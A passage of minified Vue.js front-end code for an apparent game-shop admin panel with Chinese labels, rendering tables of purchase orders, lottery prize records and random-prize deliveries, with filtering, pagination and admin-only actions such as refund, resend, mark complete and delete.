0!==a&&e.expandedBuyIds.splice(a,1)}}},scopedSlots:e._u([{key:"id",fn:function(t){return[i("span",[e._v(e._s(t))])]}},{key:"userName",fn:function(t,a){return[a.buyUser?[i("span",{staticStyle:{color:"#1890ff",cursor:"pointer"},on:{click:function(){return e.$router.push({path:"/user",query:{userName:a.buyUser.userName}})}}},[e._v(e._s(a.buyUser?a.buyUser.userName:a.userId))])]:i("span",[e._v(" - ")])]}},{key:"userSteamId",fn:function(t,a){return[a.buyUser?[i("span",{staticStyle:{color:"#1890ff",cursor:"pointer"},on:{click:function(){return e.$router.push({path:"/user",query:{steamId:a.buyUser.steamId}})}}},[e._v(e._s(a.buyUser?a.buyUser.steamId:"-"))])]:i("span",[e._v(" - ")])]}},{key:"itemName",fn:function(t,a){return[a.buyItem?[i("span",{staticStyle:{color:"#1890ff",cursor:"pointer"},on:{click:function(){return e.$router.push({path:"/items",query:{category:"item",name:a.buyItem.name}})}}},[e._v(" "+e._s(a.buyItem?a.buyItem.name+("object"==typeof a.configs&&a.configs&&a.configs.prizeName?"("+a.configs.prizeName+")":"")+("object"==typeof a.configs&&a.configs&&a.configs.name?"("+a.configs.name+")":""):a.itemId))])]:i("span",[e._v(e._s(a.itemId))])]}},{key:"itemType",fn:function(t,a){return[a.buyItemType?[i("span",{staticStyle:{color:"#1890ff",cursor:"pointer"},on:{click:function(){return e.$router.push({path:"/items",query:{category:"item-type",cnName:a.buyItemType.cnName}})}}},[e._v(e._s(a.buyItemType?a.buyItemType.cnName:"-"))])]:i("span",[e._v(" - ")])]}},{key:"number",fn:function(t){return[i("span",[e._v(e._s(t))])]}},{key:"status",fn:function(t){return[i("span",[e.buyStatusBadgeKeyValue[t]?i("a-badge",{attrs:{status:e.buyStatusBadgeKeyValue[t]}}):e._e(),i("span",[e._v(e._s(e.buyStatusKeyValue[t]))])],1)]}},{key:"createdTimeStamp",fn:function(t){return[i("span",[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}},{key:"updateTimeStamp",fn:function(t){return[i("span",[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}},{key:"expandedRowRender",fn:function(t){return i("div",{staticStyle:{margin:"0"}},[e.expandedBuyIds.find((function(e){return e===t.id}))?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("操作")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%",height:"38px","padding-top":"5px","padding-left":"10px","margin-bottom":"5px"}},[!e.userInfo||"sysAdmin"!==e.userInfo.role&&"admin"!==e.userInfo.role?e._e():i("a-button",{attrs:{size:"small",icon:"check-circle"},on:{click:function(){return e.finishBuyItem(t.id)}}},[e._v("标记为完成")]),!e.userInfo||"sysAdmin"!==e.userInfo.role&&"admin"!==e.userInfo.role?e._e():i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{disabled:!(t.configs&&t.configs.queueId),size:"small",icon:"redo"},on:{click:function(){return e.resendBuyItem(t.id)}}},[e._v("重发")]),!e.userInfo||"sysAdmin"!==e.userInfo.role&&"admin"!==e.userInfo.role?e._e():i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{disabled:!(t.configs&&t.configs.price),type:"primary",size:"small",icon:"rollback"},on:{click:function(){return e.refundBuyItem(t.id)}}},[e._v("退款")]),e.userInfo&&"sysAdmin"===e.userInfo.role?i("a-popconfirm",{attrs:{placement:"right",title:"确定要删除购买记录吗"},on:{confirm:function(){return e.deleteBuyItem(t.id)}}},[i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{type:"danger",size:"small",icon:"delete",loading:e.deleteLoading}},[e._v("删除")])],1):e._e()],1),t.isPrePurchase?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("套餐信息")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px","margin-bottom":"5px"}},[i("span",[e._v("套餐剩余次数:")]),i("span",{staticStyle:{"margin-left":"5px"}},[i("strong",[e._v(e._s(t.remainTimes))]),e._v("次")])])]:e._e(),[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("商品信息")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("商品名称:")]),i("span",{staticStyle:{"margin-left":"5px"}},[e._v(e._s(t.buyItem?t.buyItem.name:" - "))])]),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("商品类型:")]),i("span",{staticStyle:{"margin-left":"5px"}},[e._v(e._s(t.buyItemType?t.buyItemType.name:" - "))])]),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px"}},[i("span",[e._v("售价:")]),i("span",{staticStyle:{"margin-left":"5px"}},[e._v(e._s(t.buyItem?t.buyItem.price:" - "))])]),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px","margin-bottom":"5px"}},[i("span",[e._v("销量:")]),i("span",{staticStyle:{"margin-left":"5px"}},[e._v(e._s(t.buyItem?t.buyItem.sales:" - "))])]),null!==t.vehicleId?i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px","margin-bottom":"5px"}},[i("span",[e._v("载具ID:")]),i("strong",{staticStyle:{"margin-left":"5px"}},[e._v(e._s(t.vehicleId))])]):e._e()]]:e._e()],2)}}])}),i("a-pagination",{staticStyle:{"margin-top":"10px"},attrs:{"show-size-changer":"","page-size":e.buyListPagination.pageSize,current:e.buyListPagination.pageNum,total:e.buyListPagination.total},on:{change:e.onChangeBuyListPagination,showSizeChange:e.onShowSizeChangeBuyListPagination}})],1)])],1)}),[],!1,null,"152b7734",null),Ze=Xe.exports,We={name:"PrizeRecord",computed:Object(s.a)({},Object(v.mapState)(["userInfo"])),data:function(){return{cleanLoading:!1,moment:R.a,loadingPrizesListTable:!1,prizesListFilter:{userName:void 0,prizeId:void 0,timestampStart:void 0,timestampEnd:void 0},prizesListColumns:[{title:"用户昵称",key:"userName",dataIndex:"userName",width:180,align:"center",scopedSlots:{customRender:"userName"}},{title:"奖品",key:"prizes",dataIndex:"prizes",width:120,align:"center",scopedSlots:{customRender:"prizes"}},{title:"创建时间",key:"createdTimeStamp",dataIndex:"createdTimeStamp",width:150,align:"center",scopedSlots:{customRender:"createdTimeStamp"}}],prizesListData:[],prizesListPagination:{pageSize:20,pageNum:1,total:0},allPrizeTypeslList:[]}},mounted:function(){this.getAllPrizeTypeslList(),this.getPrizesList()},methods:{onPrizesListCleanFilter:function(){var e=this;this.prizesListPagination.pageNum=1,this.$nextTick((function(){e.getPrizesList(!0)}))},onPrizesListFilter:function(){var e=this;this.prizesListPagination.pageNum=1,this.$nextTick((function(){e.getPrizesList()}))},onChangePrizesListPagination:function(e){var t=this;this.prizesListPagination.pageNum=e,this.$nextTick((function(){t.getPrizesList()}))},onShowSizeChangePrizesListPagination:function(e,t){var i=this;this.prizesListPagination.pageNum=1,this.prizesListPagination.pageSize=t,this.$nextTick((function(){i.getPrizesList()}))},getPrizesList:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a,n,r,o,l,c;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a=t.prizesListPagination,n=a.pageNum,r=a.pageSize,e?(t.prizesListFilter={userName:void 0,prizeId:void 0,timestampStart:void 0,timestampEnd:void 0},o={pageNum:n,pageSize:r}):(void 0!==(l=Object(A.cloneDeep)(t.prizesListFilter)).timestampStart&&void 0!==l.timestampEnd&&(l.timestampStart=R()(l.timestampStart).valueOf(),l.timestampEnd=R()(l.timestampEnd).valueOf()),o=Object(s.a)({pageNum:n,pageSize:r},l)),t.loadingPrizesListTable=!0,i.prev=3,i.next=6,f({method:"GET",url:"/prizeRecordAdminSys/list",params:o});case 6:c=i.sent,t.loadingPrizesListTable=!1,200===c.status&&(t.prizesListPagination.total=c.data.count,t.prizesListData=c.data.list),i.next=15;break;case 11:i.prev=11,i.t0=i.catch(3),console.error(i.t0),t.loadingPrizesListTable=!1;case 15:case"end":return i.stop()}}),i,null,[[3,11]])})))()},getAllPrizeTypeslList:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,t.next=3,f({method:"GET",url:"/prizeRecord/listAllPrizeTypes"});case 3:200===(i=t.sent).status&&(e.allPrizeTypeslList=i.data.filter((function(e){return e.dollars>0}))),t.next=10;break;case 7:t.prev=7,t.t0=t.catch(0),console.error(t.t0);case 10:case"end":return t.stop()}}),t,null,[[0,7]])})))()},cleanPrizeRecord:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,e.cleanLoading=!0,t.next=4,f({method:"DELETE",url:"/prizeRecordAdminSys/clean"});case 4:200===t.sent.status&&(e.cleanLoading=!1,e.$message.success("操作成功"),e.getPrizesList()),t.next=12;break;case 8:t.prev=8,t.t0=t.catch(0),e.cleanLoading=!1,console.error(t.t0);case 12:case"end":return t.stop()}}),t,null,[[0,8]])})))()}}},Qe=We,Je=Object(S.a)(Qe,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"100%","overflow-y":"auto",padding:"10px"}},[i("a-collapse",{staticStyle:{background:"none"},attrs:{"default-active-key":"1",bordered:!1}},[i("a-collapse-panel",{key:"1",staticStyle:{border:"none"}},[i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"header"},slot:"header"},[i("span",[e._v("搜索过滤条件")]),e.userInfo&&"sysAdmin"===e.userInfo.role?[i("a-popconfirm",{attrs:{placement:"right",title:"确定要清空抽奖记录列表吗"},on:{confirm:e.cleanPrizeRecord}},[i("a-button",{staticStyle:{float:"right"},attrs:{size:"small",icon:"delete",type:"danger",loading:e.cleanLoading}},[e._v("清空抽奖记录")])],1)]:e._e(),i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small",type:"primary",icon:"filter"},nativeOn:{click:function(t){return t.stopPropagation(),e.onPrizesListFilter.apply(null,arguments)}}},[e._v("过滤")]),i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small"},nativeOn:{click:function(t){return t.stopPropagation(),e.onPrizesListCleanFilter.apply(null,arguments)}}},[e._v("清空过滤 / 刷新")])],2),i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"80px","text-align":"right",display:"inline-block"}},[e._v("用户昵称:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"15px"},attrs:{placeholder:"模糊搜索",allowClear:""},model:{value:e.prizesListFilter.userName,callback:function(t){e.$set(e.prizesListFilter,"userName",t)},expression:"prizesListFilter.userName"}}),i("div",{staticStyle:{width:"80px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("奖品类型:")]),i("a-select",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{allowClear:""},model:{value:e.prizesListFilter.prizeId,callback:function(t){e.$set(e.prizesListFilter,"prizeId",t)},expression:"prizesListFilter.prizeId"}},e._l(e.allPrizeTypeslList,(function(t){return i("a-select-option",{key:t.id,attrs:{title:t.description}},[e._v(e._s(t.description))])})),1)],1),i("div",{staticStyle:{"margin-top":"10px","overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"80px","text-align":"right",display:"inline-block"}},[e._v("创建时间:")]),i("a-range-picker",{staticStyle:{width:"320px","margin-left":"10px"},attrs:{"show-time":{format:"HH:mm:ss"},format:"YYYY-MM-DD HH:mm:ss",value:[e.prizesListFilter.timestampStart,e.prizesListFilter.timestampEnd],allowClear:""},on:{change:function(t){e.$set(e.prizesListFilter,"timestampStart",t[0]),e.$set(e.prizesListFilter,"timestampEnd",t[1])}}})],1)])],1),i("a-table",{staticStyle:{"margin-top":"10px"},attrs:{columns:e.prizesListColumns,"data-source":e.prizesListData,"row-key":"id",pagination:!1,loading:e.loadingPrizesListTable,bordered:"",scroll:{x:"100%"},size:"small"},scopedSlots:e._u([{key:"userName",fn:function(t,a){return[i("div",{staticStyle:{"text-overflow":"ellipsis","overflow-x":"hidden","white-space":"nowrap"}},[e._v(e._s(a.prizeUser&&a.prizeUser.userName?a.prizeUser.userName:t))])]}},{key:"prizes",fn:function(t,a){return[i("span",[e._v(e._s(void 0!==e.allPrizeTypeslList.find((function(e){return e.id===a.prizeId}))?e.allPrizeTypeslList.find((function(e){return e.id===a.prizeId})).description:t))])]}},{key:"buyId",fn:function(t){return[i("span",{staticStyle:{color:"#1890ff",cursor:"pointer"},on:{click:function(){return e.$router.push({path:"/buy",query:{id:t}})}}},[e._v(e._s(t))])]}},{key:"createdTimeStamp",fn:function(t){return[i("span",[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}}])}),i("a-pagination",{staticStyle:{"margin-top":"10px"},attrs:{"show-size-changer":"","page-size":e.prizesListPagination.pageSize,current:e.prizesListPagination.pageNum,total:e.prizesListPagination.total},on:{change:e.onChangePrizesListPagination,showSizeChange:e.onShowSizeChangePrizesListPagination}})],1)}),[],!1,null,"1ebd635f",null),et=Je.exports,tt={name:"RandomPrize",computed:Object(s.a)({},Object(v.mapState)(["userInfo"])),data:function(){return{moment:R.a,cleanLoading:!1,buyStatusKeyValue:{created:"已创建订单",queued:"已进入发货队列",processing:"正在发货",fullfilled:"已发货完成"},buyStatusBadgeKeyValue:{created:"default",queued:"default",processing:"processing",fullfilled:"success"},loadingBuyListTable:!1,buyListFilter:{userName:void 0,userSteamId:void 0,status:void 0,timestampStart:void 0,timestampEnd:void 0,id:void 0},buyListColumns:[{title:"所属订单ID",key:"id",dataIndex:"id",width:150,align:"center",scopedSlots:{customRender:"id"}},{title:"抽奖人昵称",key:"userName",dataIndex:"userName",width:150,align:"center",scopedSlots:{customRender:"userName"}},{title:"抽奖人Steam ID",key:"userSteamId",dataIndex:"userSteamId",width:150,align:"center",scopedSlots:{customRender:"userSteamId"}},{title:"奖品名称",key:"itemName",dataIndex:"itemName",width:180,align:"center",scopedSlots:{customRender:"itemName"}},{title:"是否十连抽",key:"isTen",dataIndex:"isTen",width:120,align:"center",scopedSlots:{customRender:"isTen"}},{title:"发货类型",key:"isImmediate",dataIndex:"isImmediate",width:100,align:"center",scopedSlots:{customRender:"isImmediate"}},{title:"没有获奖",key:"isNoPrize",dataIndex:"isNoPrize",width:100,align:"center",scopedSlots:{customRender:"isNoPrize"}},{title:"发货状态",key:"status",dataIndex:"status",width:100,align:"center",scopedSlots:{customRender:"status"}},{title:"抽奖时间",key:"createdTimeStamp",dataIndex:"createdTimeStamp",width:180,align:"center",scopedSlots:{customRender:"createdTimeStamp"}},{title:"状态更新时间",key:"updateTimeStamp",dataIndex:"updateTimeStamp",width:180,align:"center",scopedSlots:{customRender:"updateTimeStamp"}}],buyListData:[],buyListPagination:{pageSize:20,pageNum:1,total:0},expandedBuyIds:[],itemTypelList:[]}},mounted:function(){var e=this;this.$route.query.id&&(this.buyListFilter.id=this.$route.query.id),this.$nextTick((function(){e.getItemTypeList(),e.getBuyList(void 0,e.$route.query.id)}))},methods:{onBuyListCleanFilter:function(){var e=this;Object.keys(this.$route.query).length&&this.$router.push({path:"/prizes",query:{category:"random-prize"}}),this.buyListPagination.pageNum=1,this.$nextTick((function(){e.getBuyList(!0)}))},onBuyListFilter:function(){var e=this;Object.keys(this.$route.query).length&&this.$router.push({path:"/prizes",query:{category:"random-prize"}}),this.buyListPagination.pageNum=1,this.$nextTick((function(){e.getBuyList()}))},onChangeBuyListPagination:function(e){var t=this;this.buyListPagination.pageNum=e,this.$nextTick((function(){t.getBuyList()}))},onShowSizeChangeBuyListPagination:function(e,t){var i=this;this.buyListPagination.pageNum=1,this.buyListPagination.pageSize=t,this.$nextTick((function(){i.getBuyList()}))},getBuyList:function(e,t){var i=this;return Object(o.a)(regeneratorRuntime.mark((function a(){var n,r,o,l,c,d;return regeneratorRuntime.wrap((function(a){for(;;)switch(a.prev=a.next){case 0:return n=i.buyListPagination,r=n.pageNum,o=n.pageSize,e?(i.buyListFilter={userName:void 0,userSteamId:void 0,status:void 0,timestampStart:void 0,timestampEnd:void 0,id:void 0},l={specialRandomPrizeOnly:!0,pageNum:r,pageSize:o}):(void 0!==(c=Object(A.cloneDeep)(i.buyListFilter)).timestampStart&&void 0!==c.timestampEnd&&(c.timestampStart=R()(c.timestampStart).valueOf(),c.timestampEnd=R()(c.timestampEnd).valueOf()),l=Object(s.a)({pageNum:r,pageSize:o,specialRandomPrizeOnly:!0},c)),i.loadingBuyListTable=!0,a.prev=3,a.next=6,f({method:"GET",url:"/buyAdminSys/list",params:l});case 6:d=a.sent,i.loadingBuyListTable=!1,200===d.status&&(i.buyListPagination.total=d.data.count,i.buyListData=d.data.list.map((function(e){try{e.configs=JSON.parse(e.configs)}catch(e){}return e})),i.$nextTick((function(){if(void 0!==t){var e=d.data.list.find((function(e){return e.id===t}));i.$set(i,"expandedBuyIds",[e.id])}else i.$set(i,"expandedBuyIds",[])}))),a.next=15;break;case 11:a.prev=11,a.t0=a.catch(3),console.error(a.t0),i.loadingBuyListTable=!1;case 15:case"end":return a.stop()}}),a,null,[[3,11]])})))()},getItemTypeList:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,t.next=3,f({method:"GET",url:"/itemTypesAdminSys/list",params:{pageNum:1,pageSize:999999}});case 3:200===(i=t.sent).status&&(e.itemTypelList=i.data.list),t.next=10;break;case 7:t.prev=7,t.t0=t.catch(0),console.error(t.t0);case 10:case"end":return t.stop()}}),t,null,[[0,7]])})))()},finishBuyItem:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a={id:e,status:"fullfilled"},i.prev=1,i.next=4,f({method:"PUT",url:"/buyAdminSys/updateStatus",data:a});case 4:200===i.sent.status&&(t.$message.success("操作成功"),t.getBuyList()),i.next=11;break;case 8:i.prev=8,i.t0=i.catch(1),console.error(i.t0);case 11:case"end":return i.stop()}}),i,null,[[1,8]])})))()},cleanBuyRecord:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,e.cleanLoading=!0,t.next=4,f({method:"DELETE",url:"/buyAdminSys/clean"});case 4:200===t.sent.status&&(e.cleanLoading=!1,e.$message.success("操作成功"),e.getBuyList()),t.next=12;break;case 8:t.prev=8,t.t0=t.catch(0),e.cleanLoading=!1,console.error(t.t0);case 12:case"end":return t.stop()}}),t,null,[[0,8]])})))()}}},it=tt,at=Object(S.a)(it,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"100%","overflow-y":"auto",padding:"10px"}},[i("a-collapse",{staticStyle:{background:"none"},attrs:{"default-active-key":"1",bordered:!1}},[i("a-collapse-panel",{key:"1",staticStyle:{border:"none"}},[i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"header"},slot:"header"},[i("span",[e._v("搜索过滤条件")]),i("a-button",{staticStyle:{float:"right"},attrs:{size:"small",type:"primary",icon:"filter"},nativeOn:{click:function(t){return t.stopPropagation(),e.onBuyListFilter.apply(null,arguments)}}},[e._v("过滤")]),i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small"},nativeOn:{click:function(t){return t.stopPropagation(),e.onBuyListCleanFilter.apply(null,arguments)}}},[e._v("清空过滤 / 刷新")])],1),i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"110px","text-align":"right",display:"inline-block"}},[e._v("抽奖人昵称:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.buyListFilter.userName,callback:function(t){e.$set(e.buyListFilter,"userName",t)},expression:"buyListFilter.userName"}}),i("div",{staticStyle:{width:"110px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("抽奖人Steam ID:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.buyListFilter.userSteamId,callback:function(t){e.$set(e.buyListFilter,"userSteamId",t)},expression:"buyListFilter.userSteamId"}}),i("div",{staticStyle:{width:"110px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("发货状态:")]),i("a-select",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{allowClear:""},model:{value:e.buyListFilter.status,callback:function(t){e.$set(e.buyListFilter,"status",t)},expression:"buyListFilter.status"}},e._l(e.buyStatusKeyValue,(function(t,a){return i("a-select-option",{key:a,attrs:{title:t}},[e._v(e._s(t))])})),1)],1),i("div",{staticStyle:{"margin-top":"10px","overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"110px","text-align":"right",display:"inline-block"}},[e._v("抽奖时间:")]),i("a-range-picker",{staticStyle:{width:"320px","margin-left":"10px"},attrs:{"show-time":{format:"HH:mm:ss"},format:"YYYY-MM-DD HH:mm:ss",value:[e.buyListFilter.timestampStart,e.buyListFilter.timestampEnd],allowClear:""},on:{change:function(t){e.$set(e.buyListFilter,"timestampStart",t[0]),e.$set(e.buyListFilter,"timestampEnd",t[1])}}}),i("div",{staticStyle:{width:"110px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("所属订单ID:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.buyListFilter.id,callback:function(t){e.$set(e.buyListFilter,"id",t)},expression:"buyListFilter.id"}})],1)])],1),i("a-table",{staticStyle:{"margin-top":"10px"},attrs:{columns:e.buyListColumns,"data-source":e.buyListData,expandedRowKeys:e.expandedBuyIds,"row-key":"id",pagination:!1,loading:e.loadingBuyListTable,bordered:"",scroll:{x:"100%"},size:"small"},on:{expand:function(t,i){if(t)void 0===e.expandedBuyIds.find((function(e){return e===i.id}))&&e.expandedBuyIds.push(i.id);else{var a=Object.keys(e.expandedBuyIds).find((function(t){return e.expandedBuyIds[t]===i.id}));void 0!==a&&e.expandedBuyIds.splice(a,1)}}},scopedSlots:e._u([{key:"id",fn:function(t){return[i("span",[e._v(e._s(t))])]}},{key:"userName",fn:function(t,a){return[a.buyUser?[i("span",{staticStyle:{color:"#1890ff",cursor:"pointer"},on:{click:function(){return e.$router.push({path:"/user",query:{userName:a.buyUser.userName}})}}},[e._v(e._s(a.buyUser?a.buyUser.userName:a.userId))])]:i("span",[e._v(" - ")])]}},{key:"userSteamId",fn:function(t,a){return[a.buyUser?[i("span",{staticStyle:{color:"#1890ff",cursor:"pointer"},on:{click:function(){return e.$router.push({path:"/user",query:{steamId:a.buyUser.steamId}})}}},[e._v(e._s(a.buyUser?a.buyUser.steamId:"-"))])]:i("span",[e._v(" - ")])]}},{key:"itemName",fn:function(t,a){return[a.buyItem?[i("span",[e._v(e._s(a.buyItem&&"object"==typeof a.configs&&a.configs&&a.configs.prizeName?""+a.configs.prizeName:"-"))])]:i("span",[e._v("-")])]}},{key:"isTen",fn:function(t,a){return[a.buyItem?[i("span",[e._v(e._s(a.buyItem&&"object"==typeof a.configs&&a.configs&&!0===a.configs.isTen?"是":"否"))])]:i("span",[e._v("-")])]}},{key:"isImmediate",fn:function(t,a){return[a.buyItem?[i("span",[e._v(e._s(a.buyItem&&"object"==typeof a.configs&&a.configs&&void 0!==a.configs.isImmediate?!0===a.configs.isImmediate?"立即发货":"进入套餐":"-"))])]:i("span",[e._v("-")])]}},{key:"isNoPrize",fn:function(t,a){return[a.buyItem?[i("span",[e._v(e._s(a.buyItem&&"object"==typeof a.configs&&a.configs&&void 0!==a.configs.isNoPrize?!0===a.configs.isNoPrize?"是":"否":"-"))])]:i("span",[e._v("-")])]}},{key:"status",fn:function(t){return[i("span",[e.buyStatusBadgeKeyValue[t]?i("a-badge",{attrs:{status:e.buyStatusBadgeKeyValue[t]}}):e._e(),i("span",[e._v(e._s(e.buyStatusKeyValue[t]))])],1)]}},{key:"createdTimeStamp",fn:function(t){return[i("span",[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}},{key:"updateTimeStamp",fn:function(t){return[i("span",[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}},{key:"expandedRowRender",fn:function(t){return i("div",{staticStyle:{margin:"0"}},[e.expandedBuyIds.find((function(e){return e===t.id}))?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("操作")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%",height:"38px","padding-top":"5px","padding-left":"10px","margin-bottom":"5px"}},[!e.userInfo||"sysAdmin"!==e.userInfo.role&&"admin"!==e.userInfo.role?i("span",[e._v("暂无可用操作")]):i("a-button",{attrs:{size:"small",icon:"check-circle"},on:{click:function(){return e.finishBuyItem(t.id)}}},[e._v("标记为完成")])],1),t.isPrePurchase?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("套餐信息")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px","padding-left":"10px","margin-bottom":"5px"}},[i("span",[e._v("套餐剩余次数(如有):")]),i("span",{staticStyle:{"margin-left":"5px"}},[i("strong",[e._v(e._s(t.remainTimes))]),e._v("次")])])]:e._e()]:e._e()],2)}}])}),i("a-pagination",{staticStyle:{"margin-top":"10px"},attrs:{"show-size-changer":"","page-size":e.buyListPagination.pageSize,current:e.buyListPagination.pageNum,total:e.buyListPagination.total},on:{change:e.onChangeBuyListPagination,showSizeChange:e.onShowSizeChangeBuyListPagination}})],1)}),[],!1,null,"a46e0da4",null),nt=at.exports,rt={name:"Items",components:{PrizeRecord:et,RandomPrize:nt},data:function(){return{currentTab:"prize-record"}},mounted:function(){this.$route.query.category?this.currentTab=this.$route.query.category:(this.$router.push({path:"/prizes",query:Object(s.a)(Object(s.a)({},this.$route.query),{},{category:"prize-record"})}),this.currentTab="prize-record")},methods:{}},ot=rt,st=Object(S.a)(ot,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"100%"}},[i("a-page-header",{staticStyle:{border:"1px solid rgb(235, 237, 240)"},attrs:{title:"美金抽奖和物品抽奖"}}),i("div",{staticStyle:{width:"100%",height:"calc(100% - 66px)",padding:"15px","padding-top":"0"}},[i("div",{staticStyle:{width:"100%",height:"100%",background:"white","overflow-y":"auto",padding:"10px"}},[i("a-tabs",{attrs:{type:"card"},on:{change:function(t){e.$router.push({path:"/prizes",query:{category:t}})}},model:{value:e.currentTab,callback:function(t){e.currentTab=t},expression:"currentTab"}},[i("a-tab-pane",{key:"prize-record",attrs:{tab:"美金抽奖"}},["prize-record"===e.currentTab?i("PrizeRecord"):e._e()],1),i("a-tab-pane",{key:"random-prize",attrs:{tab:"物品抽奖"}},["random-prize"===e.currentTab?i("RandomPrize"):e._e()],1)],1)],1)])],1)}),[],!1,null,"d20c30ae",null),lt=st.exports,ct={name:"StoryLines",computed:Object(s.a)({},Object(v.mapState)(["userInfo"])),data:function(){return{moment:R.a,chargeDollarTypeList:{normal:"美金",complex:"组合套餐"},userChargeStatusList:{created:"已创建未付款",paid:"已付款"},userChargeStatusBadgeKeyValue:{created:"processing",paid:"success"},payTypeEnum:{alipay:"支付宝",qqpay:"QQ钱包",wxpay:"微信支付",usdtpay:"USDT"},loadingUserChargeListTable:!1,userChargeListFilter:{userName:void 0,status:void 0,chargeMoney:void 0,dollar:void 0,timestampStart:void 0,timestampEnd:void 